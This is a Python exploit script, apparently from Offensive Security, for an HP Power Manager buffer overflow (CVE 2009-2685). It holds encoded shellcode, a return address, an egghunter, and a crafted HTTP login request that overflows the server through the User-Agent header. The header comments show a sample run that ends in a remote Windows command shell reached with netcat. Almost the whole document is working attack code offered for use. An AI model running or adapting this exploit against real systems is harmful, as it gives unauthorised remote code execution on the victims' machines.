#!/usr/bin/python
# HP Power Manager Administration Universal Buffer Overflow Exploit
# CVE 2009-2685
# Tested on Win2k3 Ent SP2 English, Win XP Sp2 English
# Matteo Memelli ryujin __A-T__ offensive-security.com
# www.offensive-security.com
# Spaghetti & Pwnsauce - 07/11/2009
#
# ryujin@bt:~$ ./hppowermanager.py 172.16.30.203
# HP Power Manager Administration Universal Buffer Overflow Exploit
# ryujin __A-T__ offensive-security.com
# [+] Sending evil buffer...
# HTTP/1.0 200 OK
# [+] Done!
# [*] Check your shell at 172.16.30.203:4444 , can take up to 1 min to spawn your shell
# ryujin@bt:~$ nc -v 172.16.30.203 4444
# 172.16.30.203: inverse host lookup failed: Unknown server error : Connection timed out
# (UNKNOWN) [172.16.30.203] 4444 (?) open
# Microsoft Windows [Version 5.2.3790]
# (C) Copyright 1985-2003 Microsoft Corp.

# C:\WINDOWS\system32>

import sys
from socket import *

print "HP Power Manager Administration Universal Buffer Overflow Exploit"
print "ryujin __A-T__ offensive-security.com"
"""
try:
   HOST  = sys.argv[1]
except IndexError:
   print "Usage: %s HOST" % sys.argv[0]
   sys.exit()
"""
HOST  = "10.11.1.230"
PORT  = 80
RET   = "\xCF\xBC\x08\x76" # 7608BCCF JMP ESP MSVCP60.dll

# [*] Using Msf::Encoder::PexAlphaNum with final size of 709 bytes
#new shellcode 92 bytes
# badchar = "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a"
SHELL = ("\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x93\xbe\x8e\xbd\x83\xee\xfc\xe2\xf4\x6f\x56\x0c\xbd\x93\xbe"
"\xee\x34\x76\x8f\x4e\xd9\x18\xee\xbe\x36\xc1\xb2\x05\xef\x87"
"\x35\xfc\x95\x9c\x09\xc4\x9b\xa2\x41\x22\x81\xf2\xc2\x8c\x91"
"\xb3\x7f\x41\xb0\x92\x79\x6c\x4f\xc1\xe9\x05\xef\x83\x35\xc4"
"\x81\x18\xf2\x9f\xc5\x70\xf6\x8f\x6c\xc2\x35\xd7\x9d\x92\x6d"
"\x05\xf4\x8b\x5d\xb4\xf4\x18\x8a\x05\xbc\x45\x8f\x71\x11\x52"
"\x71\x83\xbc\x54\x86\x6e\xc8\x65\xbd\xf3\x45\xa8\xc3\xaa\xc8"
"\x77\xe6\x05\xe5\xb7\xbf\x5d\xdb\x18\xb2\xc5\x36\xcb\xa2\x8f"
"\x6e\x18\xba\x05\xbc\x43\x37\xca\x99\xb7\xe5\xd5\xdc\xca\xe4"
"\xdf\x42\x73\xe1\xd1\xe7\x18\xac\x65\x30\xce\xd6\xbd\x8f\x93"
"\xbe\xe6\xca\xe0\x8c\xd1\xe9\xfb\xf2\xf9\x9b\x94\x41\x5b\x05"
"\x03\xbf\x8e\xbd\xba\x7a\xda\xed\xfb\x97\x0e\xd6\x93\x41\x5b"
"\xed\xc3\xee\xde\xfd\xc3\xfe\xde\xd5\x79\xb1\x51\x5d\x6c\x6b"
"\x19\xd7\x96\xd6\x84\xb6\x93\x6e\xe6\xbf\x93\xbf\x35\x34\x75"
"\xd4\x9e\xeb\xc4\xd6\x17\x18\xe7\xdf\x71\x68\x16\x7e\xfa\xb1"
"\x6c\xf0\x86\xc8\x7f\xd6\x7e\x08\x31\xe8\x71\x68\xfb\xdd\xe3"
"\xd9\x93\x37\x6d\xea\xc4\xe9\xbf\x4b\xf9\xac\xd7\xeb\x71\x43"
"\xe8\x7a\xd7\x9a\xb2\xbc\x92\x33\xca\x99\x83\x78\x8e\xf9\xc7"
"\xee\xd8\xeb\xc5\xf8\xd8\xf3\xc5\xe8\xdd\xeb\xfb\xc7\x42\x82"
"\x15\x41\x5b\x34\x73\xf0\xd8\xfb\x6c\x8e\xe6\xb5\x14\xa3\xee"
"\x42\x46\x05\x7e\x08\x31\xe8\xe6\x1b\x06\x03\x13\x42\x46\x82"
"\x88\xc1\x99\x3e\x75\x5d\xe6\xbb\x35\xfa\x80\xcc\xe1\xd7\x93"
"\xed\x71\x68")

SHELL += "\x90"*(709-len(SHELL))

EH ='\x33\xD2\x90\x90\x90\x42\x52\x6a'
EH +='\x02\x58\xcd\x2e\x3c\x05\x5a\x74'
EH +='\xf4\xb8\x6e\x30\x30\x62\x8b\xfa'
EH +='\xaf\x75\xea\xaf\x75\xe7\xff\xe7'

evil =  "POST http://%s/goform/formLogin HTTP/1.1\r\n"
evil += "Host: %s\r\n"
evil += "User-Agent: %s\r\n"
evil += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
evil += "Accept-Language: en-us,en;q=0.5\r\n"
evil += "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
evil += "Keep-Alive: 300\r\n"
evil += "Proxy-Connection: keep-alive\r\n"
evil += "Referer: http://%s/index.asp\r\n"
evil += "Content-Type: application/x-www-form-urlencoded\r\n"
evil += "Content-Length: 678\r\n\r\n"
evil += "HtmlOnly=true&Password=admin&loginButton=Submit+Login&Login=admin"
evil += "\x41"*256 + RET + "\x90"*32 + EH + "\x42"*287 + "\x0d\x0a"
evil = evil % (HOST,HOST,SHELL,HOST)

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))
print '[+] Sending evil buffer...'
s.send(evil)
print s.recv(1024)
print "[+] Done!"
print "[*] Check your shell at %s:4444 , can take up to 1 min to spawn your shell" % HOST
s.close()